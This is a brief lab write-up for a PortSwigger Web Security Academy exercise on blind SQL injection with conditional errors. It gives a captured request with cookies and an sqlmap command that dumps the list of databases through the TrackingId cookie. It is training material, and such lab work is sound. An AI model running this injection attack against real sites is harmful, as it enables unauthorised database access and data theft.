# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

## Exploit

Request :

```
GET / HTTP/2
Host: 0a48003403e517af82aa433c00af00c8.web-security-academy.net
Cookie: TrackingId=f4T622iCVHc7msiq; session=0s6KA2mflEQqEyUFwo7EnLKcPBJhaG9X
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a48003403e517af82aa433c00af00c8.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
```

Get all databases :

```
sqlmap -u https://0a48003403e517af82aa433c00af00c8.web-security-academy.net/ --cookie="TrackingId=f4T622iCVHc7msiq" --level=5 --risk=3 --dbs
```